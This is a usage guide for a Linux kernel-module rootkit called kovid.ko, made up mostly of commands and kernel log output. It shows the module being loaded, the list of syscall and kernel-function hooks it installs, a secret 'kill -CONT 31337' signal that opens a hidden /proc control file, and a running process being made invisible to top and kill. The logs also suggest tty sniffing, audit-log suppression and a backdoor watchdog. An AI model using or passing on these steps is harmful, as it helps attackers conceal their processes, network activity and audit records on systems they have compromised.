# User guide

First, ensure that you've built the LKM (Loadable Kernel Module). Let's say its name is `kovid.ko`.
To load the LKM, use the following command:

```
# insmod kovid.ko 
```

You should see output similar to this:
```
[   97.774022] version 2.0.0
[   97.789236] kv: using kprobe for kallsyms_lookup_name
[   97.801020] invalid data: bpf_map_get will not work
[   97.812963] add sysaddr: ffffffff8187ea90
[   97.826660] Installing: 'sys_exit_group' syscall=1
[   97.838647] add sysaddr: ffffffff8186c430
[   97.845733] Installing: 'sys_clone' syscall=1
[   97.857663] add sysaddr: ffffffff81866940
[   97.864522] Installing: 'sys_kill' syscall=1
[   97.876814] add sysaddr: ffffffff81879880
[   97.883672] Installing: 'sys_read' syscall=1
[   97.897356] add sysaddr: ffffffff819f4c50
[   97.904322] Installing: 'sys_bpf' syscall=1
[   97.916497] add sysaddr: ffffffff8188bf80
[   97.923767] Installing: 'tcp4_seq_show' syscall=0
[   97.940202] Installing: 'udp4_seq_show' syscall=0
[   97.956733] Installing: 'tcp6_seq_show' syscall=0
[   97.976237] Installing: 'udp6_seq_show' syscall=0
[   97.993105] Installing: 'packet_rcv' syscall=0
[   98.009972] Installing: 'tpacket_rcv' syscall=0
[   98.027238] Installing: 'account_process_tick' syscall=0
[   98.034914] Installing: 'account_system_time' syscall=0
[   98.042575] Installing: 'audit_log_start' syscall=0
[   98.050958] Installing: 'filldir' syscall=0
[   98.061948] Installing: 'filldir64' syscall=0
[   98.072683] Installing: 'tty_read' syscall=0
[   98.085251] Installing: 'proc_dointvec' syscall=0
[   98.092877] ftrace hook 0 on sys_exit_group
[   98.092986] ftrace hook 1 on sys_clone
[   98.093039] ftrace hook 2 on sys_kill
[   98.093101] ftrace hook 3 on sys_read
[   98.093164] ftrace hook 4 on sys_bpf
[   98.093226] ftrace hook 5 on tcp4_seq_show
[   98.093294] ftrace hook 6 on udp4_seq_show
[   98.093364] ftrace hook 7 on tcp6_seq_show
[   98.093488] ftrace hook 8 on udp6_seq_show
[   98.093560] ftrace hook 9 on packet_rcv
[   98.093624] ftrace hook 10 on tpacket_rcv
[   98.093700] ftrace hook 11 on account_process_tick
[   98.093780] ftrace hook 12 on account_system_time
[   98.093860] ftrace hook 13 on audit_log_start
[   98.093933] ftrace hook 14 on filldir
[   98.093995] ftrace hook 15 on filldir64
[   98.094060] ftrace hook 16 on tty_read
[   98.094122] ftrace hook 17 on proc_dointvec
[   98.096047] Waiting for event
[   98.096392] hide [0000000037b8b334] irq/102_pciehp : 130
[   98.096959] hide [00000000bbbd2bda] irq/101_pciehp : 129
[   98.097074] hide [00000000a395b0d4] irq/100_pciehp : 127
[   98.097168] hide [000000009cf2760e] irq/103_pciehp : 128
[   98.097484] loaded.
```

Make sure you remember what value you used for `PROCNAME` during the build process.
Now, let’s use our trick—specifically, the signal that opens and closes the `/proc` files:

```
# kill -CONT 31337
```
By doing this, we should see our `proc` loaded:
```
# kill -CONT 31337
[  929.419542] /proc/myprocname loaded, timeout: 1200s
```

## A simple feature

The `top` command shows `a.out` process:

```
Mem: 34248K used, 67184K free, 80K shrd, 324K buff, 10544K cached
CPU:  90% usr   9% sys   0% nic   0% idle   0% io   0% irq   0% sirq
Load average: 3.77 3.50 2.27 2/49 146
  PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
  133   112 root     R     2336   2% 100% ./a.out
  111     1 root     S     9824  10%   0% sshd: /usr/sbin/sshd [listener] 0 of 1
```

To hide the process:

```
# echo 133 > /proc/myprocname
[ 1012.760147] hide [00000000fd76f643] a.out : 133
```

Attempting to kill the process:

```
# kill -9 133
sh: can't kill pid 133: No such process
```

The process is no longer visible in the `top` command either.
When we unload the LKM, the process becomes visible again:

```
# rmmod kovid.ko
[  800.659219] Uninstalling: 'sys_exit_group' syscall=1
[  800.673635] Uninstalling: 'sys_clone' syscall=1
[  800.772610] Uninstalling: 'sys_kill' syscall=1
[  800.876607] Uninstalling: 'sys_read' syscall=1
[  800.980667] Uninstalling: 'sys_bpf' syscall=1
[  801.084634] Uninstalling: 'tcp4_seq_show' syscall=0
[  801.188588] Uninstalling: 'udp4_seq_show' syscall=0
[  801.292584] Uninstalling: 'tcp6_seq_show' syscall=0
[  801.396669] Uninstalling: 'udp6_seq_show' syscall=0
[  801.500613] Uninstalling: 'packet_rcv' syscall=0
[  801.604574] Uninstalling: 'tpacket_rcv' syscall=0
[  801.708578] Uninstalling: 'account_process_tick' syscall=0
[  801.812584] Uninstalling: 'account_system_time' syscall=0
[  801.916587] Uninstalling: 'audit_log_start' syscall=0
[  802.020593] Uninstalling: 'filldir' syscall=0
[  802.124594] Uninstalling: 'filldir64' syscall=0
[  802.228660] Uninstalling: 'tty_read' syscall=0
[  802.332614] Uninstalling: 'proc_dointvec' syscall=0
[  802.448088] unhide [0000000037b8b334] irq/102_pciehp : 130
[  802.448256] unhide [00000000bbbd2bda] irq/101_pciehp : 129
[  802.448341] unhide [00000000a395b0d4] irq/100_pciehp : 127
[  802.448921] unhide [000000009cf2760e] irq/103_pciehp : 128
[  802.449082] unhide [00000000fd76f643] a.out : 133
[  802.449184] stop sniff thread
[  802.449290] Got event
[  802.449338] BD watchdog OFF
[  802.692971] stop proc timeout thread
[  803.612482] /proc/myprocname unloaded.
[  803.612819] stop tainted thread
[  804.956719] unloaded.
# kill -9 133
```
